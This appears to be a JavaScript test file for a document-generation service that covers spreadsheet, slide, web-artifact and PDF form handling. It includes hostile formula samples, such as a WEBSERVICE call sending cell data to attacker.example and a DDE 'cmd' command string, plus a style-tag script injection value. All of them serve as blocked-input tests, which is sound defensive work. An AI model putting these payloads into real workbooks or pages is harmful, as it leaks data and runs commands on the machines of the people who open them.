// SPDX-FileCopyrightText: IntraFind Software AG
// SPDX-License-Identifier: LicenseRef-iHub-Apps

/**
 * Excel workbook engine (`services/documents/xlsx`) and PPTX KPI metric cards:
 * SpreadsheetML generation, corporate template styling, live formulas and
 * `_xlfn.` prefixing, worker rendering, and PPTX `metricCards`.
 *
 * Run: node --test server/tests/xlsx-engine.test.js
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import JSZip from 'jszip';

import { documentTemplateSchema } from '../validators/documentTemplateSchema.js';
import { applyTemplateToXlsxSpec } from '../services/documents/templates/applyTemplate.js';
import {
  buildXlsx,
  columnLetter,
  isBlockedFormula,
  normalizeFormula,
  sanitizeSheets
} from '../services/documents/xlsx/buildXlsx.js';
import { renderXlsx } from '../services/documents/xlsx/renderXlsx.js';
import { runCreateXlsx, xlsxSpecFromToolArgs } from '../services/documents/xlsx/xlsxTools.js';
import { docxSpecFromToolArgs } from '../services/documents/docx/docxTools.js';
import {
  clearHeldGeneratedFiles,
  heldGeneratedFile
} from '../services/documents/generatedFiles.js';
import {
  EMU_PER_INCH,
  metricCardFillLuminance,
  metricCards
} from '../services/documents/pptx/pptxXml.js';
import {
  injectBrandTokens,
  inspectWebArtifact,
  runCreateWebArtifact
} from '../services/documents/webArtifacts/webArtifactTools.js';
import { assemblePdfText, formatFormAnnotations } from '../../shared/documentExtraction/pdfText.js';

async function assertPackageIntegrity(buffer) {
  const zip = await JSZip.loadAsync(buffer);
  const types = await zip.file('[Content_Types].xml').async('string');
  const defaults = new Set(
    [...types.matchAll(/Extension="([^"]+)"/g)].map(m => m[1].toLowerCase())
  );
  const overrides = new Set([...types.matchAll(/PartName="([^"]+)"/g)].map(m => m[1]));
  for (const name of Object.keys(zip.files)) {
    const entry = zip.files[name];
    if (entry.dir || name === '[Content_Types].xml') continue;
    const ext = name.split('.').pop().toLowerCase();
    assert.ok(overrides.has(`/${name}`) || defaults.has(ext), `part ${name} has no content type`);
    if (!name.endsWith('.rels')) continue;
    const owner = name === '_rels/.rels' ? '' : name.replace(/(^|\/)_rels\/([^/]+)\.rels$/, '$1$2');
    const dir = owner.includes('/') ? owner.slice(0, owner.lastIndexOf('/')) : '';
    const xml = await entry.async('string');
    for (const match of xml.matchAll(/<Relationship\b[^>]*>/g)) {
      const tag = match[0];
      if (/TargetMode="External"/.test(tag)) continue;
      const target = /Target="([^"]+)"/.exec(tag)[1];
      const resolved = target.startsWith('/')
        ? target.slice(1)
        : path.posix.normalize(path.posix.join(dir, target));
      assert.ok(zip.file(resolved), `${name} points at missing ${resolved}`);
    }
  }
  return zip;
}

const VALID_TEMPLATE = {
  id: 'acme',
  name: { en: 'ACME' },
  brand: { primaryColor: '#E30613', bodyFont: 'Brand Serif', companyName: 'ACME GmbH' },
  document: { header: '{title}', footer: '{company} · Internal' }
};

describe('Excel workbook engine (xlsx)', () => {
  it('converts column indices and normalizes modern Excel formulas with _xlfn.', () => {
    assert.equal(columnLetter(0), 'A');
    assert.equal(columnLetter(25), 'Z');
    assert.equal(columnLetter(26), 'AA');
    assert.equal(
      normalizeFormula('=XLOOKUP(A2, B2:B10, C2:C10)'),
      '_xlfn.XLOOKUP(A2, B2:B10, C2:C10)'
    );
    assert.equal(
      normalizeFormula('=ifs(D2>0.15,"High",TRUE,"Core")'),
      '_xlfn.IFS(D2>0.15,"High",TRUE,"Core")'
    );
    // Already prefixed or classic functions stay untouched.
    assert.equal(normalizeFormula('=_xlfn.XLOOKUP(A2,B:B,C:C)'), '_xlfn.XLOOKUP(A2,B:B,C:C)');
    assert.equal(normalizeFormula('=SUMIFS(C2:C10,A2:A10,"EMEA")'), 'SUMIFS(C2:C10,A2:A10,"EMEA")');
  });

  it('stores FILTER/SORT in the _xlws namespace and never prefixes twice', () => {
    assert.equal(normalizeFormula('=FILTER(A2:A9,B2:B9>1)'), '_xlfn._xlws.FILTER(A2:A9,B2:B9>1)');
    assert.equal(normalizeFormula('=sort(A2:A9)'), '_xlfn._xlws.SORT(A2:A9)');
    assert.equal(
      normalizeFormula('=_xlfn._xlws.FILTER(A2:A9,B2:B9>1)'),
      '_xlfn._xlws.FILTER(A2:A9,B2:B9>1)'
    );
    assert.equal(normalizeFormula('=_xlfn.UNIQUE(A2:A9)'), '_xlfn.UNIQUE(A2:A9)');
    assert.equal(
      normalizeFormula('=IFNA(VLOOKUP(A2,D:E,2,0),0)'),
      '_xlfn.IFNA(VLOOKUP(A2,D:E,2,0),0)'
    );
    assert.equal(normalizeFormula('=STDEV.S(B2:B9)'), '_xlfn.STDEV.S(B2:B9)');
  });

  it('leaves string literals and quoted sheet names alone', () => {
    assert.equal(normalizeFormula("='Sort (2)'!B2"), "'Sort (2)'!B2");
    assert.equal(normalizeFormula('=IF(A1="IFS(",1,0)'), 'IF(A1="IFS(",1,0)');
    assert.equal(
      normalizeFormula("=SORT('Filter (3)'!A1:A5)"),
      "_xlfn._xlws.SORT('Filter (3)'!A1:A5)"
    );
  });

  it('flags formulas that reach outside the workbook or run code', () => {
    assert.equal(isBlockedFormula('WEBSERVICE("https://attacker.example/?d="&A2)'), true);
    assert.equal(isBlockedFormula('HYPERLINK("https://x.example","go")'), true);
    assert.equal(isBlockedFormula('_xlfn.FILTERXML(A1,"//a")'), true);
    assert.equal(isBlockedFormula("cmd|'/c calc'!A0"), true);
    assert.equal(isBlockedFormula('_xlfn.IMAGE("https://x.example/?d="&A2)'), true);
    assert.equal(isBlockedFormula('TRANSLATE(A2,"en","de")'), true);
    // A sheet or name that merely contains the word is not a call.
    assert.equal(isBlockedFormula("'Image (2)'!B2+IMAGES"), false);
    assert.equal(isBlockedFormula('SUM(A1:A5)'), false);
    // The same words inside a string literal are just text.
    assert.equal(isBlockedFormula('IF(A1="WEBSERVICE(",1,0)'), false);
    assert.equal(isBlockedFormula('A1&"|"&B1'), false);
  });

  it('writes a blocked formula as text with a warning and keeps integers unformatted', async () => {
    const { buffer, warnings } = await buildXlsx({
      title: 'T',
      sheets: [
        {
          name: 'S',
          columns: ['Year', 'Link'],
          rows: [[2026, '=WEBSERVICE("https://attacker.example/?d="&A2)']]
        }
      ]
    });
    assert.equal(warnings.length, 1);
    assert.match(warnings[0], /external-data or command function/);
    const zip = await JSZip.loadAsync(buffer);
    const sheet = await zip.file('xl/worksheets/sheet1.xml').async('string');
    assert.doesNotMatch(sheet, /<f>/);
    assert.match(sheet, /t="inlineStr"[^>]*><is><t xml:space="preserve">=WEBSERVICE/);
    // 2026 stays in the general format (style 0 numFmt), not "#,##0".
    const styles = await zip.file('xl/styles.xml').async('string');
    const yearStyle = /<c r="A2" s="(\d+)"><v>2026<\/v><\/c>/.exec(sheet);
    assert.ok(yearStyle, 'year cell is a number');
    const xfs = [...styles.match(/<cellXfs[^>]*>(.*?)<\/cellXfs>/s)[1].matchAll(/<xf [^>]*>/g)];
    assert.match(xfs[Number(yearStyle[1])][0], /numFmtId="0"/);
  });

  it('sanitizes sheet names, deduplicates case-insensitively and enforces limits', () => {
    const warnings = [];
    const sheets = sanitizeSheets(
      [
        { name: 'Summary: 2026/2027?*[Draft]', columns: ['A'], rows: [[1]] },
        { name: 'summary  2026 2027   draft', columns: ['A'], rows: [[2]] }
      ],
      warnings
    );
    assert.equal(sheets[0].name, 'Summary 2026 2027 Draft');
    assert.equal(sheets[1].name, 'summary 2026 2027 draft (2)');
    assert.throws(() => xlsxSpecFromToolArgs({ title: 'T', sheets: '[]' }), /non-empty/);
  });

  it('builds multi-sheet workbooks with corporate brand styles, live formulas and _xlfn prefixes', async () => {
    const { spec } = applyTemplateToXlsxSpec(
      {
        title: 'Financial Model',
        language: 'en-US',
        sheets: [
          {
            name: 'Summary: 2026/2027?',
            columns: [
              { header: 'Region', align: 'left' },
              { header: '2025 (€)', format: 'currency' },
              { header: '2026 (€)', format: 'currency' },
              { header: 'Growth', format: 'percent' },
              { header: 'Tier', format: 'text' },
              { header: 'Updated', format: 'date' }
            ],
            rows: [
              [
                'EMEA',
                120000,
                144000,
                '=(C2-B2)/B2',
                '=IFS(D2>0.15,"High",TRUE,"Core")',
                '2026-10-15'
              ],
              [
                'APAC',
                80000,
                96000,
                '=(C3-B3)/B3',
                '=IFS(D3>0.15,"High",TRUE,"Core")',
                '2026-10-15'
              ],
              {
                cells: ['Total', '=SUM(B2:B3)', '=SUM(C2:C3)', '=(C4-B4)/B4', '', ''],
                total: true
              }
            ]
          },
          {
            name: 'Assumptions',
            columns: ['Driver', { header: 'Value', format: 'percent' }],
            rows: [{ cells: ['Target Growth', 0.15], assumption: true }]
          }
        ]
      },
      { template: documentTemplateSchema.parse(VALID_TEMPLATE), assets: {} }
    );
    const { buffer, meta, warnings } = await renderXlsx(spec);
    assert.equal(meta.sheets, 2);
    assert.deepEqual(warnings, []);
    const zip = await assertPackageIntegrity(buffer);
    const workbook = await zip.file('xl/workbook.xml').async('string');
    assert.match(workbook, /name="Summary 2026 2027"/);
    assert.match(workbook, /name="Assumptions"/);
    assert.match(workbook, /fullCalcOnLoad="1"/);
    const sheet = await zip.file('xl/worksheets/sheet1.xml').async('string');
    assert.match(sheet, /<f>\(C2-B2\)\/B2<\/f>/);
    assert.match(sheet, /<f>_xlfn\.IFS\(D2&gt;0\.15,&quot;High&quot;,TRUE,&quot;Core&quot;\)<\/f>/);
    assert.match(sheet, /<f>SUM\(B2:B3\)<\/f>/);
    // AutoFilter covers header + data rows (A1:F3), excluding the trailing Total row on row 4.
    assert.match(sheet, /<autoFilter ref="A1:F3"\/>/);
    const styles = await zip.file('xl/styles.xml').async('string');
    assert.match(styles, /FFE30613/);
    assert.match(styles, /FF0000FF/);
  });

  it('runs create_xlsx in the worker and holds the .xlsx file for the chat', async () => {
    clearHeldGeneratedFiles();
    const user = { id: 'u-xlsx' };
    const res = await runCreateXlsx({
      filename: 'q3-budget',
      title: 'Q3 Budget',
      sheets: JSON.stringify([
        {
          name: 'Budget',
          columns: ['Item', { header: 'Cost', format: 'currency' }],
          rows: [
            ['Hosting', 1200],
            ['Licenses', 800],
            ['Total', '=SUM(B2:B3)']
          ]
        }
      ]),
      user,
      chatId: 'chat-xlsx'
    });
    assert.equal(res.success, true, res.error);
    assert.equal(res.file.name, 'q3-budget.xlsx');
    assert.equal(res.file.sheets, 1);
    const held = heldGeneratedFile(user, res.file.id, { chatId: 'chat-xlsx' });
    assert.equal(
      held.mimeType,
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    );
    await assertPackageIntegrity(held.data);
  });
});

describe('PPTX KPI metric cards', () => {
  it('renders 1–4 side-by-side DrawingML KPI callout cards with accent1 scheme colors', () => {
    let id = 10;
    const shapes = metricCards({
      nextId: () => (id += 1),
      rect: { x: 0, y: 0, cx: 10 * EMU_PER_INCH, cy: 2 * EMU_PER_INCH },
      metrics: [
        { value: '€3.05M', label: 'Q3 Revenue', note: '+12 % YoY' },
        { value: '98.4 %', label: 'Net Retention', note: '+1.2 pp' }
      ],
      lang: 'en-US'
    });
    assert.equal(shapes.length, 2);
    assert.match(shapes[0], /€3\.05M/);
    assert.match(shapes[0], /Q3 Revenue/);
    assert.match(shapes[0], /\+12 % YoY/);
    assert.match(shapes[0], /<a:schemeClr val="accent1"\/>/);
  });

  it('sets the value in dark text when accent1 is too light to read on the card', () => {
    const render = accent => {
      let id = 10;
      return metricCards({
        nextId: () => (id += 1),
        rect: { x: 0, y: 0, cx: 10 * EMU_PER_INCH, cy: 2 * EMU_PER_INCH },
        metrics: [{ value: '42', label: 'Answers', note: 'since May' }],
        lang: 'en-US',
        accent
      })[0];
    };
    const valueColor = xml =>
      /sz="\d+" b="1" dirty="0"><a:solidFill><a:(?:schemeClr|srgbClr) val="(\w+)"/.exec(xml)[1];
    assert.equal(valueColor(render('FFFFFF')), '0F172A');
    assert.equal(valueColor(render('F5F5F5')), '0F172A');
    assert.equal(valueColor(render('1E3A8A')), 'accent1');
  });

  it('never takes the label or note colour from the template tx1 (it can map to white)', () => {
    let id = 10;
    const [xml] = metricCards({
      nextId: () => (id += 1),
      rect: { x: 0, y: 0, cx: 10 * EMU_PER_INCH, cy: 2 * EMU_PER_INCH },
      metrics: [{ value: '42', label: 'Answers', note: 'since May' }],
      lang: 'en-US',
      accent: '1E3A8A'
    });
    assert.doesNotMatch(xml, /schemeClr val="tx1"/);
    assert.match(xml, /<a:srgbClr val="0F172A"\/>.*Answers/);
  });

  it('computes the card fill the way DrawingML tints it (HSL lightness × 0.1 + 0.9)', () => {
    // A black accent tints to a light grey (L = 0.9 → luminance ≈ 0.79), not to white.
    assert.ok(Math.abs(metricCardFillLuminance('000000') - 0.79) < 0.01);
    // A saturated blue stays a little darker than a yellow of the same tint.
    assert.ok(metricCardFillLuminance('0000FF') < metricCardFillLuminance('FFFF00'));
    assert.ok(metricCardFillLuminance('FFFFFF') > 0.99);
    assert.equal(metricCardFillLuminance('not-a-color'), 0.9);
  });
});

describe('Document tool defaults', () => {
  it('gives the Word cover page and the {date} placeholder one date, today by default', () => {
    const today = new Date().toISOString().slice(0, 10);
    assert.equal(docxSpecFromToolArgs({ title: 't', markdown: 'x', coverPage: true }).date, today);
    assert.equal(
      docxSpecFromToolArgs({ title: 't', markdown: 'x', date: '2026-10-15' }).date,
      '2026-10-15'
    );
  });
});

describe('Web artifacts skill tool (create_web_artifact) & PDF AcroForm extraction', () => {
  it('injects corporate brand CSS custom properties and flags sandbox hazards', async () => {
    const rawHtml =
      '<!DOCTYPE html><html><head><title>Dashboard</title></head><body><h1>KPIs</h1></body></html>';
    const themed = injectBrandTokens(rawHtml, {
      primaryColor: '#E30613',
      accentColor: '#0F766E',
      font: 'Inter'
    });
    assert.match(themed, /--brand-primary:\s*#E30613/);
    assert.match(themed, /--brand-accent:\s*#0F766E/);
    assert.match(themed, /--brand-font:\s*Inter/);

    const warnings = inspectWebArtifact(
      '<!DOCTYPE html><html><body><script src="./app.js"></script><script>localStorage.setItem("k","v")</script></body></html>',
      'html'
    );
    assert.equal(warnings.length, 2);
    assert.match(warnings[0], /Relative <script src=/);
    assert.match(warnings[1], /localStorage/);

    clearHeldGeneratedFiles();
    const user = { id: 'u-web' };
    const res = await runCreateWebArtifact({
      filename: 'roi-simulator.html',
      title: 'ROI Simulator',
      content: rawHtml,
      primaryColor: '#1d4ed8',
      user,
      chatId: 'chat-web'
    });
    assert.equal(res.success, true);
    assert.equal(res.file.name, 'roi-simulator.html');
    assert.equal(res.file.mimeType, 'text/plain');
    const held = heldGeneratedFile(user, res.file.id, { chatId: 'chat-web' });
    assert.match(held.data.toString('utf8'), /--brand-primary:\s*#1d4ed8/);
  });

  it('warns about links that lead nowhere in the sandboxed preview', () => {
    const dead = inspectWebArtifact(
      '<a href="#">Quellen 2</a><a href="https://example.com/x">Ext</a><a href="./detail.html">D</a>',
      'html'
    );
    assert.equal(dead.length, 1);
    assert.match(dead[0], /cannot work/);
    assert.match(dead[0], /"#"/);
    assert.equal(
      inspectWebArtifact('<script>window.open("https://x.test")</script>', 'html').length,
      1
    );
    const fine =
      '<a href="#sources">Quellen</a><section id="sources"></section><a href="mailto:a@b.de">Mail</a>';
    assert.deepEqual(inspectWebArtifact(fine, 'html'), []);
    assert.equal(inspectWebArtifact('<a href="#missing">x</a>', 'html').length, 1);
  });

  it('checks that each storage access is guarded, not that some try block exists', () => {
    const guarded = '<script>try { localStorage.setItem("k","v"); } catch (e) {}</script>';
    assert.deepEqual(inspectWebArtifact(guarded, 'html'), []);
    const unrelatedTry =
      '<script>try { JSON.parse("{}"); } catch (e) {} localStorage.setItem("k","v");</script>';
    const warnings = inspectWebArtifact(unrelatedTry, 'html');
    assert.equal(warnings.length, 1);
    assert.match(warnings[0], /localStorage/);
    const nested = '<script>try { if (a) { sessionStorage.getItem("x"); } } catch (e) {}</script>';
    assert.deepEqual(inspectWebArtifact(nested, 'html'), []);
  });

  it('keeps brand values from breaking out of the style tag or being read as replacement patterns', () => {
    const html = '<!DOCTYPE html><html><head></head><body></body></html>';
    const out = injectBrandTokens(html, {
      primaryColor: '#E30613;}</style><script>x()</script>',
      accentColor: "$&$'",
      font: '"Open Sans", sans-serif'
    });
    const style = out.match(/<style id="ihub-brand-tokens">(.*?)<\/style>/s)?.[1] ?? '';
    assert.doesNotMatch(out, /<script>x\(\)/);
    assert.match(style, /--brand-primary:#E30613stylescriptx\(\)script;/);
    // Nothing usable left of the accent value: the default applies.
    assert.match(style, /--brand-accent:#0f766e;/);
    assert.match(style, /--brand-font:"Open Sans", sans-serif;/);
    assert.equal(out.match(/<\/head>/g)?.length, 1);
  });

  it('warns about absolute script, stylesheet and image URLs the sandbox blocks', () => {
    const cdn = '<script src="https://cdn.example/chart.js"></script>';
    assert.match(inspectWebArtifact(cdn, 'html').join(' '), /external script/i);
    const css = '<link rel="stylesheet" href="//fonts.example/app.css">';
    assert.match(inspectWebArtifact(css, 'html').join(' '), /external script, stylesheet/i);
    const img = '<img src="https://img.example/a.png">';
    assert.match(
      inspectWebArtifact(img, 'html').join(' '),
      /external script, stylesheet or image/i
    );
    assert.deepEqual(inspectWebArtifact('<img src="data:image/png;base64,AAAA">', 'html'), []);
  });

  it('injects brand tokens unless they are defined, not merely referenced', () => {
    const referenced =
      '<!DOCTYPE html><html><head></head><body style="color: var(--brand-primary)"></body></html>';
    assert.match(
      injectBrandTokens(referenced, { primaryColor: '#E30613' }),
      /--brand-primary:\s*#E30613/
    );
    const defined =
      '<!DOCTYPE html><html><head><style>:root{--brand-primary:#000}</style></head><body></body></html>';
    assert.equal(injectBrandTokens(defined, { primaryColor: '#E30613' }), defined);
    const once = injectBrandTokens(referenced, { primaryColor: '#E30613' });
    assert.equal(injectBrandTokens(once, { primaryColor: '#111111' }), once);
  });

  it('honors an explicit format over the file name', async () => {
    clearHeldGeneratedFiles();
    const user = { id: 'u-fmt' };
    const res = await runCreateWebArtifact({
      filename: 'chart.svg',
      format: 'html',
      content: '<!DOCTYPE html><html><body><h1>Chart</h1></body></html>',
      user,
      chatId: 'chat-fmt'
    });
    assert.equal(res.success, true);
    assert.equal(res.file.name, 'chart.html');
  });

  it('marks a radio option selected only when the group value is its own value', () => {
    const blocks = formatFormAnnotations([
      {
        subtype: 'Widget',
        fieldName: 'Size',
        radioButton: true,
        buttonValue: 'S',
        fieldValue: 'M'
      },
      {
        subtype: 'Widget',
        fieldName: 'Size',
        radioButton: true,
        buttonValue: 'M',
        fieldValue: 'M'
      },
      { subtype: 'Widget', fieldName: 'Size', radioButton: true, buttonValue: 'L', fieldValue: 'M' }
    ]);
    assert.deepEqual(
      blocks.slice(1).map(block => block.text),
      [
        '- Size [radio]: unselected (S)',
        '- Size [radio]: selected (M)',
        '- Size [radio]: unselected (L)'
      ]
    );
  });

  it('compares a checkbox field value with its export value', () => {
    const blocks = formatFormAnnotations([
      {
        subtype: 'Widget',
        fieldName: 'Extras',
        checkBox: true,
        exportValue: 'Wifi',
        fieldValue: 'Wifi'
      },
      {
        subtype: 'Widget',
        fieldName: 'Extras',
        checkBox: true,
        exportValue: 'Parking',
        fieldValue: 'Wifi'
      }
    ]);
    assert.equal(blocks[1].text, '- Extras [checkbox]: checked (Wifi)');
    assert.equal(blocks[2].text, '- Extras [checkbox]: unchecked (Parking)');
  });

  it('keeps each checkbox option of one field, even when they share a state', () => {
    const blocks = formatFormAnnotations([
      { subtype: 'Widget', fieldName: 'Extras', checkBox: true, exportValue: 'Wifi' },
      { subtype: 'Widget', fieldName: 'Extras', checkBox: true, exportValue: 'Parking' }
    ]);
    assert.deepEqual(
      blocks.slice(1).map(block => block.text),
      ['- Extras [checkbox]: unchecked (Wifi)', '- Extras [checkbox]: unchecked (Parking)']
    );
  });

  it('extracts AcroForm widget fields (text, checkbox, radio, choice) from uploaded PDF pages', () => {
    const blocks = formatFormAnnotations([
      { subtype: 'Widget', fieldName: 'FullName', fieldType: 'Tx', fieldValue: 'Jane Doe' },
      { subtype: 'Widget', fieldName: 'ApproveTerms', checkBox: true, fieldValue: 'Yes' },
      { subtype: 'Widget', fieldName: 'Newsletter', checkBox: true, fieldValue: 'Off' },
      {
        subtype: 'Widget',
        fieldName: 'Department',
        fieldType: 'Ch',
        fieldValue: 'Engineering',
        options: [{ displayValue: 'Engineering' }, { displayValue: 'Finance' }]
      }
    ]);
    assert.equal(blocks[0].text, '[Form fields]');
    assert.equal(blocks[1].text, '- FullName [text]: Jane Doe');
    assert.equal(blocks[2].text, '- ApproveTerms [checkbox]: checked');
    assert.equal(blocks[3].text, '- Newsletter [checkbox]: unchecked');
    assert.equal(
      blocks[4].text,
      '- Department [choice]: Engineering (options: Engineering, Finance)'
    );

    const text = assemblePdfText([
      {
        items: [{ str: 'Onboarding Form', hasEOL: true }],
        annotations: [
          { subtype: 'Widget', fieldName: 'FullName', fieldType: 'Tx', fieldValue: 'Jane Doe' }
        ]
      }
    ]);
    assert.match(text, /\[Form fields\]/);
    assert.match(text, /- FullName \[text\]: Jane Doe/);
  });
});
